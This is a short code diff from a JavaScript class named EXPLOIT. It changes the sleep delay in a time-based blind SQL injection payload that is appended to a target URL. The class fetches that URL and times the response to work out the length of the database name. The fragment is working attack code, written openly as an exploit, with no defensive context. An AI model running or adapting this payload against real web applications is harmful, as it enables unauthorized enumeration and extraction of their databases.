@@ -27,7 +27,7 @@ class EXPLOIT{
     async get_db_length(){
         console.log("Enumerating Database length")
         for(let i=0;i<10;i++){
-            let payload = "' AND (select if(length(database())="+i+" , sleep(10) ,null )) --+";
+            let payload = "' AND (select if(length(database())="+i+" , sleep(5) ,null )) --+";
             let link = this.url + payload;
             let start_time = performance.now();
             await fetch(link)
